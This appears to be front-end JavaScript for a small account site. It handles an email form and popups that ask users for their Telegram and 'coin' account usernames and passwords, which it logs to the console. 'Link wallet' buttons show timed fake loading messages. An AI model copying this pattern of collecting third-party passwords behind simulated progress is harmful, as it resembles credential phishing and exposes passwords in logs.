/**
 * author : tahasite
 */

document.addEventListener("DOMContentLoaded", () => {
  const emailForm = document.getElementById("emailForm");

  emailForm.addEventListener("submit", (event) => {
    event.preventDefault();

    const emailInput = document.getElementById("emailInput").value.trim();

    fetch("/addEmail", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ email: emailInput }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.success) {
          alert("Email added successfully!");
        } else {
          alert("Error: " + data.message);
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("An error occurred, please try again later.");
      });
  });

  const emailDisplay = document.getElementById("emailDisplay");

  fetch("/getEmail")
    .then((response) => response.json())
    .then((data) => {
      if (data.success) {
        emailDisplay.textContent = `Email: ${data.email}`;
      } else {
        emailDisplay.textContent = data.message;
      }
    })
    .catch((error) => {
      console.error("Error:", error);
      emailDisplay.textContent = "An error occurred, please try again later.";
    });
});

document.addEventListener("DOMContentLoaded", () => {
  const telegramButton = document.getElementById("link_tl");
  const coinButton = document.getElementById("link_coin");

  const telegramPopup = document.getElementById("telegramPopup");
  const coinPopup = document.getElementById("coinPopup");

  telegramButton.addEventListener("click", () => {
    telegramPopup.style.display = "block";
  });

  coinButton.addEventListener("click", () => {
    coinPopup.style.display = "block";
  });

  window.closePopup = function (popupId) {
    const popup = document.getElementById(popupId);
    popup.style.display = "none";
  };

  const saveTelegramButton = document.getElementById("saveTelegram");
  saveTelegramButton.addEventListener("click", () => {
    const telegramUsername = document.getElementById("telegramUsername").value;
    const telegramPassword = document.getElementById("telegramPassword").value;

    console.log("Telegram Username:", telegramUsername);
    console.log("Telegram Password:", telegramPassword);

    telegramPopup.style.display = "none";
  });

  const saveCoinButton = document.getElementById("saveCoin");
  saveCoinButton.addEventListener("click", () => {
    const coinUsername = document.getElementById("coinUsername").value;
    const coinPassword = document.getElementById("coinPassword").value;

    console.log("Coin Username:", coinUsername);
    console;
    console.log("Coin Password:", coinPassword);

    coinPopup.style.display = "none";
  });
});

document.getElementById("linktowallet").addEventListener("click", () => {
  const loadingOverlay = document.getElementById("loadingOverlay");
  const message = document.getElementById("message_tl");

  loadingOverlay.style.display = "flex";

  setTimeout(() => {
    loadingOverlay.style.display = "none";
    message.style.display = "flex";

    setTimeout(() => {
      message.style.display = "none";
    }, 8000);
  }, 5000);
});

document.getElementById("linkcionwallet").addEventListener("click", () => {
  const loadingOverlaycion = document.getElementById("loadingOverlaycion");
  const message = document.getElementById("message_coin");

  loadingOverlaycion.style.display = "flex";

  setTimeout(() => {
    loadingOverlaycion.style.display = "none";
    message.style.display = "flex";

    setTimeout(() => {
      message.style.display = "none";
    }, 8000);
  }, 5000);
});

document.addEventListener("DOMContentLoaded", () => {
  const usernameDiv = document.getElementById("usernameAccount");

  fetch("/usernameAccount")
    .then((response) => response.json())
    .then((data) => {
      if (data.success) {
        usernameDiv.textContent = `Username: ${data.usernameAccount}`;
      } else {
        window.location.href = "/login.html";
      }
    })
    .catch((error) => {
      console.error("Error:", error);
      window.location.href = "/login.html";
    });
});
